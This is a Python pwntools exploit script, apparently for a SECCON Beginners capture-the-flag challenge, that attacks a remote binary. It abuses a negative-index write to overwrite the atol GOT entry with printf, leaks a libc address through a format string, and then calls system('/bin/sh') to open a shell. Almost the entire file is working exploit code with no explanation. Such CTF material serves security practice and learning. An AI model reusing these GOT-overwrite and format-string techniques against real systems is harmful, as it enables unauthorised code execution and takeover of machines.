"""
  1 i := rbp-0x54
  2 *buffer := rbp-0x50
  3 v := rbp-0x48
  4 *x[0] := rbp-0x40
"""
from pwn import *

context.arch='amd64'
#context.log_level = "DEBUG"
elf = ELF("./chall")
libc = ELF("libc.so.6")
#p = process("./chall")
p = remote("es.quals.beginners.seccon.jp", "9003")
"""
gdb.attach(p, '''
 b *0x400826
 handle SIGALRM ignore
 continue
''')
"""

binsh = 0x0601080
buf = 0x601100
payload = 0x0601100
atol_got = 0x601040
printf_plt = 0x0400590


def writeBuf1( addr, value ):
  ad_diff = 0x8
  p.sendlineafter("index: ", "-2" )
  p.sendlineafter("value: ", str(addr-ad_diff) )
  
  p.sendlineafter("index: ", "0" )
  p.sendlineafter("value: ", b'a'*ad_diff+value )

def writeBuf2( addr, value ):
  ad_diff = 0x8 
  p.sendlineafter("index: ", p64(-2) )
  p.sendlineafter("value: ", addr )
  
  p.sendlineafter("index: ", "0" )
  p.sendlineafter("value: ", b'a'*ad_diff+value )

"""
# write /bin/sh\0 to bss
p.sendlineafter("index: ", "-2" )
p.sendlineafter("value: ", str(binsh-0x08) )
p.sendlineafter("index: ", "/bin/sh" )
p.sendlineafter("value: ", "/bin/sh" )
input()
"""

# libc leak
p.sendlineafter("index: ", "-2" )
p.sendlineafter("value: ", str( elf.got["atol"]-0x08 ) ) #malloc
p.sendlineafter("index: ", p64( 0xdeadbeef ) + p64( elf.plt["printf"] ) )
#p.interactive() #input chekking
p.sendlineafter("value: ", "%25$p"), 
libc_base = int( p.recvline(), 16 ) - libc.symbols["__libc_start_main"] - 0xe7
system = libc_base + libc.symbols["system"]
info( "libc: 0x%x, system: 0x%x", libc_base, system )

input()

# call system("/bin/sh")
p.sendlineafter("index: ", b"/bin/sh\0" + p64( system ) )
#p.sendlineafter("value: ", b"/bin/sh\0" )

p.interactive()

